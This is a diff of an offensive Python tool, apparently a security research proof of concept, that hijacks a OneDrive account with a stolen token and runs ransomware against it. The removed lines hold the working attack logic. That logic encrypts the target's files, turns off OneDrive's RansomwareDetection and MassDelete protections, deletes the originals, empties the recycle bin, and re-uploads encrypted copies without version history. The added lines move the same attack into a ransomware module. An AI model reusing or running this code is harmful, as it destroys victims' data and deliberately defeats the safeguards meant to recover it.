@@ -1,42 +1,15 @@
 import json
 import argparse
 import urllib
-import time
 import requests
-from onedrive_api.onedrive_session import OneDriveSession
-from onedrive_api.onedrive_item import OneDriveFileItem
-from cryptography.fernet import Fernet
-from temp_email import TempEmail
 import re
+
 import options
+from doubledrive.cloud_ransomware.onedrive_ransomware import OneDriveRansomware
+from temp_email import TempEmail
+from doubledrive.cloud_drive.onedrive.onedrive import OneDrive
+from doubledrive.cloud_drive.onedrive.onedrive_item import OneDriveFileItem
 
-
-def create_encrypted_contents_from_onedrive_files(onedrive_session: OneDriveSession, onedrive_file_items: list[OneDriveFileItem]) -> dict[str, bytes]:
-    key = Fernet.generate_key()
-    with open("key.key", "wb") as keyfile:
-        keyfile.write(key)
-
-    paths_to_encrypted_contents = {}
-    for onedrive_file_item in onedrive_file_items:
-        print(f"Encrypting file: {onedrive_file_item.full_path}")
-        file_content = onedrive_session.read_file_content(onedrive_file_item)
-        file_new_content = Fernet(key).encrypt(file_content)
-        paths_to_encrypted_contents[onedrive_file_item.full_path] = file_new_content
-
-    return paths_to_encrypted_contents
-
-
-def encrypt_onedrive_file_items(onedrive_session: OneDriveSession, paths_to_encrypted_contents: dict[str, bytes]) -> dict[str, bytes]:
-    for onedrive_file_path, file_encrypted_content in paths_to_encrypted_contents.items():
-        onedrive_item = onedrive_session.get_onedrive_item_by_path(onedrive_file_path)
-        onedrive_session.modify_file_content(onedrive_item, file_encrypted_content)
-
-
-def restore_encrypted_files_without_version_history(onedrive_session: OneDriveSession, paths_to_encrypted_contents: dict[str, bytes]):
-    for file_path, encrypted_content in paths_to_encrypted_contents.items():
-        print(f"Restoring encrypted file without version history: {file_path}")
-        onedrive_session.create_file(f"{file_path}.encrypted", encrypted_content)
-    
 
 def save_token_in_cache(drive_id, token):
     with open(f"{drive_id}.cache", "w") as f:
@@ -57,7 +30,7 @@ def get_token_from_temp_email():
     onedrive_file_auth_key = file_url_params["authkey"][0]
     onedrive_file_id = file_url_params["id"][0]
     onedrive_file_drive_id = file_url_params["cid"][0]
-    onedrive_session = OneDriveSession()
+    onedrive_session = OneDrive()
     windows_live_token = onedrive_session.read_shared_file_content(onedrive_file_drive_id, onedrive_file_id, onedrive_file_auth_key).decode()
     return windows_live_token
 
@@ -75,10 +48,7 @@ def get_args_selected_token(args, onedrive_session):
     return token
 
 
-def remote_ransomware(onedrive_session: OneDriveSession):
-    print("Disabling RansomwareDetection and MassDelete features in the target's OneDrive account")
-    onedrive_session.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})
-
+def get_target_onedrive_items(onedrive_session: OneDrive):
     all_onedrive_files_to_encrypt = []
     for item in options.JUNCTION_NAMES_TO_TARGET_PATHS.keys():
         onedrive_junction_item = onedrive_session.get_onedrive_item_by_path(f"/{item}")
@@ -86,25 +56,7 @@ def remote_ransomware(onedrive_session: OneDriveSession):
         items_to_encrypt = [item for item in onedrive_junction_children if isinstance(item, OneDriveFileItem)]
         all_onedrive_files_to_encrypt.extend(items_to_encrypt)
 
-
-    paths_to_encrypted_contents = create_encrypted_contents_from_onedrive_files(onedrive_session, all_onedrive_files_to_encrypt)
-    
-    if not options.QUICK_DELETE:
-        encrypt_onedrive_file_items(onedrive_session, paths_to_encrypted_contents)
-        print("Waiting for the files to update in the target endpoint...")
-        time.sleep(10)
-
-    print("Deleting all encrypted files from OneDrive")
-    for item in all_onedrive_files_to_encrypt:
-        onedrive_session.delete_onedrive_item(item)
-
-    # Wait enough time for the files to move into the recycle bin
-    print("Waiting for the deleted files to move into the recycle bin...")
-    time.sleep(10)
-    print("Emptying recycle bin")
-    onedrive_session.empty_recycle_bin()
-
-    restore_encrypted_files_without_version_history(onedrive_session, paths_to_encrypted_contents)
+    return all_onedrive_files_to_encrypt
 
 
 def parse_args():
@@ -125,7 +77,7 @@ def parse_args():
 
 def main():
     args = parse_args()
-    onedrive_session = OneDriveSession()
+    onedrive_session = OneDrive()
     token = get_args_selected_token(args, onedrive_session)
     onedrive_session.login_using_token(token)
     save_token_in_cache(onedrive_session.get_drive_id(), onedrive_session.get_token())
@@ -144,7 +96,9 @@ def main():
         onedrive_session.create_file(f"/{options.CMD_FILE_NAME}", json.dumps(cmd_dict).encode(), modify_if_exists=True)
 
     if args.remote_ransomware:
-        remote_ransomware(onedrive_session)
+        onedrive_ransomware = OneDriveRansomware(onedrive_session)
+        all_onedrive_files_to_encrypt = get_target_onedrive_items(onedrive_session)
+        onedrive_ransomware.start_ransomware(all_onedrive_files_to_encrypt, quick_delete=options.QUICK_DELETE)
 
     
 
